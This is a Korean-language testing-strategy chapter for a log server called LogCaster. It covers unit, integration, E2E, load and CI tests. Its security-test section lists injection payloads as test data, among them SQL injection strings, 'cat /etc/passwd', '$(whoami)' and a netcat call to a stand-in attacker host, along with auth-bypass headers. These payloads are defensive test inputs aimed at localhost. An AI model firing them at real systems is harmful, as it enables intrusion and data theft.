# 09. 테스팅 전략

## 🎯 목표
LogCaster의 품질을 보장하기 위한 포괄적인 테스트 전략과 자동화된 테스트 파이프라인을 구축합니다.

## 📋 Prerequisites
- 테스트 프레임워크 (pytest, gtest, CTest)
- CI/CD 환경
- 부하 테스트 도구 (JMeter, Locust)
- 코드 커버리지 도구

---

## 1. 테스트 피라미드

### 1.1 테스트 레벨 구성

```yaml
# test-pyramid.yaml
test_levels:
  unit_tests:
    percentage: 70%
    execution_time: < 1 minute
    frequency: on_every_commit
    
  integration_tests:
    percentage: 20%
    execution_time: < 5 minutes
    frequency: on_merge_request
    
  e2e_tests:
    percentage: 10%
    execution_time: < 15 minutes
    frequency: before_deployment
```

---

## 2. 단위 테스트

### 2.1 C 단위 테스트 (Unity Framework)

```c
// test_log_buffer.c
#include "unity.h"
#include "log_buffer.h"

void setUp(void) {
    // 각 테스트 전 실행
}

void tearDown(void) {
    // 각 테스트 후 실행
}

void test_buffer_initialization(void) {
    circular_buffer_t* buffer = create_buffer(100);
    
    TEST_ASSERT_NOT_NULL(buffer);
    TEST_ASSERT_EQUAL(100, buffer->capacity);
    TEST_ASSERT_EQUAL(0, buffer->count);
    TEST_ASSERT_EQUAL(0, buffer->head);
    TEST_ASSERT_EQUAL(0, buffer->tail);
    
    destroy_buffer(buffer);
}

void test_add_single_log(void) {
    circular_buffer_t* buffer = create_buffer(10);
    
    int result = add_log(buffer, "Test log message");
    
    TEST_ASSERT_EQUAL(0, result);
    TEST_ASSERT_EQUAL(1, buffer->count);
    TEST_ASSERT_EQUAL_STRING("Test log message", 
                             buffer->entries[0].message);
    
    destroy_buffer(buffer);
}

void test_buffer_overflow(void) {
    circular_buffer_t* buffer = create_buffer(2);
    
    add_log(buffer, "Log 1");
    add_log(buffer, "Log 2");
    add_log(buffer, "Log 3");  // Should overwrite "Log 1"
    
    TEST_ASSERT_EQUAL(2, buffer->count);
    TEST_ASSERT_EQUAL_STRING("Log 2", buffer->entries[0].message);
    TEST_ASSERT_EQUAL_STRING("Log 3", buffer->entries[1].message);
    
    destroy_buffer(buffer);
}

void test_concurrent_access(void) {
    circular_buffer_t* buffer = create_buffer(1000);
    pthread_t threads[10];
    
    // 10개 스레드에서 동시에 로그 추가
    for (int i = 0; i < 10; i++) {
        pthread_create(&threads[i], NULL, add_logs_worker, buffer);
    }
    
    for (int i = 0; i < 10; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // 데이터 무결성 검증
    TEST_ASSERT_EQUAL(1000, buffer->count);
    
    destroy_buffer(buffer);
}

int main(void) {
    UNITY_BEGIN();
    
    RUN_TEST(test_buffer_initialization);
    RUN_TEST(test_add_single_log);
    RUN_TEST(test_buffer_overflow);
    RUN_TEST(test_concurrent_access);
    
    return UNITY_END();
}
```

### 2.2 C++ 단위 테스트 (Google Test)

```cpp
// test_LogBuffer.cpp
#include <gtest/gtest.h>
#include "LogBuffer.h"

class LogBufferTest : public ::testing::Test {
protected:
    void SetUp() override {
        buffer = std::make_unique<LogBuffer>(100);
    }
    
    void TearDown() override {
        buffer.reset();
    }
    
    std::unique_ptr<LogBuffer> buffer;
};

TEST_F(LogBufferTest, Initialization) {
    EXPECT_EQ(buffer->getCapacity(), 100);
    EXPECT_EQ(buffer->getSize(), 0);
    EXPECT_TRUE(buffer->isEmpty());
}

TEST_F(LogBufferTest, AddSingleLog) {
    buffer->addLog("Test log message");
    
    EXPECT_EQ(buffer->getSize(), 1);
    EXPECT_FALSE(buffer->isEmpty());
    
    auto logs = buffer->getRecentLogs(1);
    ASSERT_EQ(logs.size(), 1);
    EXPECT_EQ(logs[0].message, "Test log message");
}

TEST_F(LogBufferTest, BufferOverflow) {
    auto smallBuffer = LogBuffer(2);
    
    smallBuffer.addLog("Log 1");
    smallBuffer.addLog("Log 2");
    smallBuffer.addLog("Log 3");
    
    auto logs = smallBuffer.getAllLogs();
    ASSERT_EQ(logs.size(), 2);
    EXPECT_EQ(logs[0].message, "Log 2");
    EXPECT_EQ(logs[1].message, "Log 3");
}

TEST_F(LogBufferTest, ConcurrentAccess) {
    const int numThreads = 10;
    const int logsPerThread = 100;
    std::vector<std::thread> threads;
    
    for (int i = 0; i < numThreads; i++) {
        threads.emplace_back([this, i, logsPerThread]() {
            for (int j = 0; j < logsPerThread; j++) {
                buffer->addLog("Thread " + std::to_string(i) + 
                              " Log " + std::to_string(j));
            }
        });
    }
    
    for (auto& t : threads) {
        t.join();
    }
    
    EXPECT_EQ(buffer->getSize(), 100);  // Buffer capacity
}

TEST_F(LogBufferTest, QueryPerformance) {
    // 성능 테스트
    auto start = std::chrono::high_resolution_clock::now();
    
    for (int i = 0; i < 10000; i++) {
        buffer->addLog("Log " + std::to_string(i));
    }
    
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    
    EXPECT_LT(duration.count(), 100);  // 100ms 이내
}
```

---

## 3. 통합 테스트

### 3.1 Python 통합 테스트

```python
# test_integration.py
import pytest
import socket
import time
import subprocess
import psutil

class TestLogCasterIntegration:
    
    @classmethod
    def setup_class(cls):
        """테스트 클래스 시작 시 서버 실행"""
        cls.server_process = subprocess.Popen(
            ['./logcaster-c', '-P'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(2)  # 서버 시작 대기
    
    @classmethod
    def teardown_class(cls):
        """테스트 클래스 종료 시 서버 중지"""
        cls.server_process.terminate()
        cls.server_process.wait()
    
    def test_server_is_running(self):
        """서버 실행 확인"""
        assert self.server_process.poll() is None
        
        # 포트 확인
        connections = psutil.net_connections()
        ports = [conn.laddr.port for conn in connections if conn.status == 'LISTEN']
        assert 9999 in ports
        assert 9998 in ports
    
    def test_send_and_query_log(self):
        """로그 전송 및 조회"""
        # 로그 전송
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9999))
            s.send(b'Test integration log\n')
            response = s.recv(1024)
            assert response == b'OK\n'
        
        time.sleep(0.5)
        
        # 로그 조회
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9998))
            s.send(b'SEARCH integration\n')
            response = s.recv(4096).decode()
            assert 'Test integration log' in response
    
    def test_concurrent_connections(self):
        """동시 연결 테스트"""
        import threading
        
        successful_connections = []
        
        def connect_and_send(thread_id):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(('localhost', 9999))
                    s.send(f'Thread {thread_id} log\n'.encode())
                    response = s.recv(1024)
                    if response == b'OK\n':
                        successful_connections.append(thread_id)
            except Exception as e:
                print(f"Thread {thread_id} failed: {e}")
        
        threads = []
        for i in range(100):
            t = threading.Thread(target=connect_and_send, args=(i,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        assert len(successful_connections) >= 95  # 95% 성공률
    
    def test_persistence(self):
        """영속성 테스트"""
        # 로그 전송
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9999))
            s.send(b'Persistence test log\n')
        
        # 서버 재시작
        self.server_process.terminate()
        self.server_process.wait()
        
        self.server_process = subprocess.Popen(
            ['./logcaster-c', '-P'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(2)
        
        # 로그 확인
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9998))
            s.send(b'SEARCH persistence\n')
            response = s.recv(4096).decode()
            assert 'Persistence test log' in response
```

---

## 4. End-to-End 테스트

### 4.1 E2E 테스트 시나리오

```python
# test_e2e.py
import pytest
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class TestLogCasterE2E:
    
    @classmethod
    def setup_class(cls):
        """브라우저 드라이버 설정"""
        cls.driver = webdriver.Chrome()
        cls.wait = WebDriverWait(cls.driver, 10)
        cls.base_url = "http://localhost:8080"
    
    @classmethod
    def teardown_class(cls):
        """브라우저 종료"""
        cls.driver.quit()
    
    def test_complete_user_journey(self):
        """완전한 사용자 시나리오"""
        # 1. 로그인
        self.driver.get(f"{self.base_url}/login")
        self.driver.find_element(By.ID, "username").send_keys("admin")
        self.driver.find_element(By.ID, "password").send_keys("password")
        self.driver.find_element(By.ID, "login-btn").click()
        
        # 2. 대시보드 확인
        self.wait.until(EC.presence_of_element_located((By.ID, "dashboard")))
        
        # 3. 로그 전송
        self.driver.find_element(By.ID, "send-log-btn").click()
        log_input = self.driver.find_element(By.ID, "log-message")
        log_input.send_keys("E2E test log message")
        self.driver.find_element(By.ID, "submit-log").click()
        
        # 4. 로그 검색
        search_input = self.driver.find_element(By.ID, "search-logs")
        search_input.send_keys("E2E test")
        self.driver.find_element(By.ID, "search-btn").click()
        
        # 5. 결과 확인
        results = self.wait.until(
            EC.presence_of_element_located((By.CLASS_NAME, "log-results"))
        )
        assert "E2E test log message" in results.text
        
        # 6. 로그 필터링
        self.driver.find_element(By.ID, "filter-error").click()
        filtered_results = self.driver.find_elements(By.CLASS_NAME, "log-entry")
        for result in filtered_results:
            assert "ERROR" in result.text
```

---

## 5. 성능 테스트

### 5.1 부하 테스트 (Locust)

```python
# locustfile.py
from locust import HttpUser, task, between
import random
import string

class LogCasterUser(HttpUser):
    wait_time = between(1, 3)
    
    def on_start(self):
        """사용자 세션 시작"""
        self.client.verify = False
        self.log_messages = [
            "INFO: User logged in",
            "DEBUG: Processing request",
            "ERROR: Connection timeout",
            "WARN: High memory usage",
            "INFO: Transaction completed"
        ]
    
    @task(3)
    def send_log(self):
        """로그 전송"""
        message = random.choice(self.log_messages)
        response = self.client.post(
            "/logs",
            json={"message": message, "level": message.split(":")[0]},
            catch_response=True
        )
        
        if response.status_code == 200:
            response.success()
        else:
            response.failure(f"Failed with {response.status_code}")
    
    @task(2)
    def query_logs(self):
        """로그 조회"""
        query_types = ["COUNT", "RECENT 10", "SEARCH error", "FILTER ERROR"]
        query = random.choice(query_types)
        
        with self.client.get(
            f"/query?q={query}",
            catch_response=True
        ) as response:
            if response.elapsed.total_seconds() > 2:
                response.failure("Query took too long")
            elif response.status_code == 200:
                response.success()
    
    @task(1)
    def health_check(self):
        """헬스체크"""
        self.client.get("/health")

# 실행: locust -f locustfile.py --host=http://localhost:9999
```

### 5.2 스트레스 테스트

```bash
#!/bin/bash
# stress-test.sh

echo "🏃 스트레스 테스트 시작..."

# JMeter 테스트 실행
jmeter -n -t logcaster-stress-test.jmx \
    -l results.jtl \
    -e -o report \
    -Jusers=1000 \
    -Jrampup=60 \
    -Jduration=300

# Apache Bench 테스트
ab -n 100000 -c 1000 -k \
    -H "Content-Type: text/plain" \
    http://localhost:9999/

# 메모리 누수 테스트
valgrind --leak-check=full \
    --show-leak-kinds=all \
    --track-origins=yes \
    --log-file=valgrind.log \
    ./logcaster-c &

PID=$!
sleep 300
kill $PID

# CPU 프로파일링
perf record -g -p $(pgrep logcaster) -- sleep 60
perf report > perf-report.txt

echo "✅ 스트레스 테스트 완료"
```

---

## 6. 보안 테스트

### 6.1 보안 테스트 스크립트

```python
# test_security.py
import pytest
import socket
import requests

class TestSecurity:
    
    def test_sql_injection(self):
        """SQL 인젝션 테스트"""
        payloads = [
            "'; DROP TABLE logs; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--"
        ]
        
        for payload in payloads:
            response = requests.get(
                f"http://localhost:9998/query",
                params={"search": payload}
            )
            # 에러가 아닌 정상 응답 확인
            assert response.status_code in [200, 400]
            assert "syntax error" not in response.text.lower()
            assert "sql" not in response.text.lower()
    
    def test_buffer_overflow(self):
        """버퍼 오버플로우 테스트"""
        large_payload = "A" * 100000
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9999))
            s.send(large_payload.encode())
            response = s.recv(1024)
            # 서버가 크래시하지 않고 응답
            assert response is not None
    
    def test_command_injection(self):
        """명령 인젝션 테스트"""
        payloads = [
            "test; ls -la",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "$(whoami)"
        ]
        
        for payload in payloads:
            response = requests.post(
                "http://localhost:9999/logs",
                data=payload
            )
            assert response.status_code in [200, 400]
    
    def test_authentication_bypass(self):
        """인증 우회 시도"""
        headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "localhost"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},
            {"Cookie": "session=admin"}
        ]
        
        for headers in headers_list:
            response = requests.get(
                "http://localhost:9998/admin",
                headers=headers
            )
            assert response.status_code == 401
```

---

## 7. 테스트 자동화

### 7.1 CI/CD 테스트 파이프라인

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        compiler: [gcc, clang]
    steps:
    - uses: actions/checkout@v3
    
    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y cmake valgrind lcov
    
    - name: Build
      run: |
        mkdir build && cd build
        cmake -DCMAKE_BUILD_TYPE=Debug -DENABLE_COVERAGE=ON ..
        make
    
    - name: Run unit tests
      run: |
        cd build
        ctest --output-on-failure
    
    - name: Generate coverage report
      run: |
        lcov --capture --directory . --output-file coverage.info
        lcov --remove coverage.info '/usr/*' --output-file coverage.info
        lcov --list coverage.info
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.info
        fail_ci_if_error: true

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'
    
    - name: Install dependencies
      run: |
        pip install pytest pytest-cov pytest-timeout
    
    - name: Run integration tests
      run: |
        pytest tests/integration --timeout=300 --cov=.
    
    - name: Upload test results
      uses: actions/upload-artifact@v3
      with:
        name: test-results
        path: test-results.xml

  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
    - uses: actions/checkout@v3
    
    - name: Run performance tests
      run: |
        docker run -d --name logcaster -p 9999:9999 logcaster:test
        sleep 5
        
        # 부하 테스트
        docker run --rm -v $PWD:/mnt/locust \
          locustio/locust -f /mnt/locust/locustfile.py \
          --headless -u 100 -r 10 -t 60s \
          --host http://logcaster:9999
    
    - name: Analyze results
      run: |
        python scripts/analyze_performance.py results.json
        
        # 성능 기준 체크
        if [ $(jq '.stats[0].avg_response_time' results.json) -gt 100 ]; then
          echo "Performance regression detected!"
          exit 1
        fi

  security-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
    - uses: actions/checkout@v3
    
    - name: Run security tests
      run: |
        # SAST
        docker run --rm -v $PWD:/src \
          returntocorp/semgrep --config=auto
        
        # 의존성 체크
        docker run --rm -v $PWD:/src \
          owasp/dependency-check --scan /src
        
        # 컨테이너 스캔
        trivy image logcaster:test
```

---

## 8. 테스트 리포트

### 8.1 테스트 리포트 생성

```bash
#!/bin/bash
# generate-test-report.sh

echo "📊 테스트 리포트 생성..."

# HTML 리포트 생성
cat > test-report.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>LogCaster Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .summary { background: #f0f0f0; padding: 15px; border-radius: 5px; }
        .passed { color: green; }
        .failed { color: red; }
        .skipped { color: orange; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>LogCaster Test Report</h1>
    <div class="summary">
        <h2>Summary</h2>
        <p>Date: $(date)</p>
        <p>Total Tests: $(grep -c "^test_" test-results.xml)</p>
        <p class="passed">Passed: $(grep -c "passed" test-results.xml)</p>
        <p class="failed">Failed: $(grep -c "failed" test-results.xml)</p>
        <p class="skipped">Skipped: $(grep -c "skipped" test-results.xml)</p>
        <p>Coverage: $(grep "TOTAL" coverage.txt | awk '{print $4}')</p>
    </div>
    
    <h2>Test Results</h2>
    <table>
        <tr>
            <th>Test Suite</th>
            <th>Tests</th>
            <th>Passed</th>
            <th>Failed</th>
            <th>Time (s)</th>
        </tr>
        $(python3 scripts/parse_test_results.py)
    </table>
    
    <h2>Performance Metrics</h2>
    <table>
        <tr>
            <th>Metric</th>
            <th>Value</th>
            <th>Threshold</th>
            <th>Status</th>
        </tr>
        <tr>
            <td>Average Response Time</td>
            <td>$(jq '.avg_response_time' perf.json)ms</td>
            <td>100ms</td>
            <td class="$([ $(jq '.avg_response_time' perf.json) -lt 100 ] && echo "passed" || echo "failed")">
                $([ $(jq '.avg_response_time' perf.json) -lt 100 ] && echo "✓" || echo "✗")
            </td>
        </tr>
        <tr>
            <td>Throughput</td>
            <td>$(jq '.throughput' perf.json) req/s</td>
            <td>1000 req/s</td>
            <td class="$([ $(jq '.throughput' perf.json) -gt 1000 ] && echo "passed" || echo "failed")">
                $([ $(jq '.throughput' perf.json) -gt 1000 ] && echo "✓" || echo "✗")
            </td>
        </tr>
    </table>
</body>
</html>
EOF

echo "✅ 테스트 리포트 생성 완료: test-report.html"
```

---

## ✅ 체크리스트

### 필수 확인사항
- [ ] 단위 테스트 커버리지 > 80%
- [ ] 통합 테스트 구현
- [ ] E2E 테스트 시나리오
- [ ] 성능 테스트 기준 설정
- [ ] 보안 테스트 실행
- [ ] CI/CD 통합

### 권장사항
- [ ] 변이 테스트
- [ ] 카오스 엔지니어링
- [ ] A/B 테스트
- [ ] 부하 테스트 자동화
- [ ] 테스트 리포트 자동 생성
- [ ] 테스트 데이터 관리

---

## 🎯 다음 단계
→ [10_deployment_steps.md](10_deployment_steps.md) - 실제 배포 단계